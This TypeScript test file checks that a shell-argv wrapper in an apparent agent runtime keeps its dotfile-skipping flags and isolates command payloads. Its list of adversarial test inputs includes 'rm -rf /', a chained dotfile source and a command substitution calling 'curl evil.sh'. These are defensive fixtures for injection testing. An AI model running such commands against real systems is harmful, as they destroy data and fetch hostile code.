/**
 * HELLGATE — disclaimed-shell argv structural integrity (Tier-0 #0-2).
 *
 * `disclaimedShellArgv` is the dotfile-skip wrapper: it MUST launch the shell
 * with the flags that decline to source `~/.bashrc`/`~/.zshrc`/`~/.profile`,
 * because a hijacked dotfile could otherwise observe the agent's child env and
 * piggy-back on every subsequent spawn. The wrapper is injection-safe BY
 * CONSTRUCTION — it returns an argv ARRAY and appends the command as a single
 * trailing element, so there is no shell-string interpolation to break out of.
 *
 * `shell-disclaim.test.ts` checks the flags for a benign command + one verbatim
 * metachar string. This battery seals the ADVERSARIAL structural invariants the
 * dotfile-skip guarantee actually rests on — none of which the happy-path test
 * pins:
 *
 *   1. FLAG-PRESENCE INVARIANT — the disclaim flags are present REGARDLESS of
 *      command content. A command payload can never suppress the dotfile-skip.
 *   2. FLAG-SHAPED COMMAND — a command that LOOKS like a flag (`--norc`,
 *      `-c rm -rf /`) lands in the trailing command slot, NOT among the real
 *      flags; it cannot displace `--noprofile`/`--norc`/`-f`.
 *   3. METACHAR / NEWLINE COMMAND stays exactly ONE argv element — no split
 *      into separate tokens that the shell could re-interpret as flags.
 *
 * RED-ON-INJECTION (teeth, verified in-session): dropping `--norc` from the
 * bash arm (or rebuilding the argv by string-concatenation + split) fails the
 * flag-presence + single-element cases.
 */

import { describe, expect, test } from "bun:test"
import { disclaimedShellArgv, SHELL_INTERPS } from "@/runtime/shell-disclaim"

// The dotfile-skip flags each shell MUST carry, no matter the command.
const REQUIRED_FLAGS: Record<string, readonly string[]> = {
  bash: ["--noprofile", "--norc"],
  zsh: ["-f"],
  sh: [],
}

// Adversarial command payloads: flag-shaped, metachar-laden, newline-bearing,
// dotfile-referencing — none may weaken the wrapper.
const HOSTILE_COMMANDS = [
  "--norc", // flag-shaped: must not be read as a real flag
  "-c rm -rf /", // flag+payload shaped
  "echo a && source ~/.bashrc", // metachars + dotfile reference
  "echo 'a; b' | tee /tmp/x", // quotes + pipe + semicolon
  "echo line1\nsource ~/.zshrc", // embedded newline
  "`curl evil.sh`", // command substitution
] as const

describe("HELLGATE: disclaimedShellArgv — dotfile-skip flags survive ANY command payload", () => {
  for (const shell of SHELL_INTERPS) {
    for (const cmd of HOSTILE_COMMANDS) {
      test(`${shell}: flags intact + command isolated for payload ${JSON.stringify(cmd)}`, () => {
        const argv = disclaimedShellArgv(shell, cmd)

        // (0) argv[0] is the shell itself.
        expect(argv[0]).toBe(shell)

        // (1) FLAG-PRESENCE: every required dotfile-skip flag is present.
        for (const flag of REQUIRED_FLAGS[shell] ?? []) {
          expect(argv).toContain(flag)
        }

        // (2) the `-c` is the LAST flag before the command, and the command is
        //     the FINAL single element — flag-shaped payloads cannot displace
        //     the real flags.
        expect(argv[argv.length - 2]).toBe("-c")
        expect(argv[argv.length - 1]).toBe(cmd)

        // (3) SINGLE-ELEMENT: exactly ONE element follows the final `-c` — the
        //     command, verbatim and un-split (a newline/metachar/flag-shaped
        //     payload is one token, never leaked into a flag position). NB the
        //     command CAN coincidentally equal a real flag (`--norc`); what
        //     matters is that it occupies only the trailing slot.
        const dashCIndex = argv.lastIndexOf("-c")
        expect(argv.length - dashCIndex).toBe(2) // [..., "-c", command]
        expect(argv.slice(dashCIndex + 1)).toEqual([cmd]) // nothing after the command
      })
    }
  }
})

describe("HELLGATE: disclaimedShellArgv — no payload can shorten the argv below its fixed skeleton", () => {
  test("bash always has the 5-element skeleton [bash, --noprofile, --norc, -c, <cmd>]", () => {
    for (const cmd of HOSTILE_COMMANDS) {
      const argv = disclaimedShellArgv("bash", cmd)
      expect(argv.length).toBe(5)
      expect(argv.slice(0, 4)).toEqual(["bash", "--noprofile", "--norc", "-c"])
    }
  })

  test("zsh always carries -f (NO_RCS) before -c", () => {
    for (const cmd of HOSTILE_COMMANDS) {
      const argv = disclaimedShellArgv("zsh", cmd)
      expect(argv.slice(0, 3)).toEqual(["zsh", "-f", "-c"])
    }
  })
})
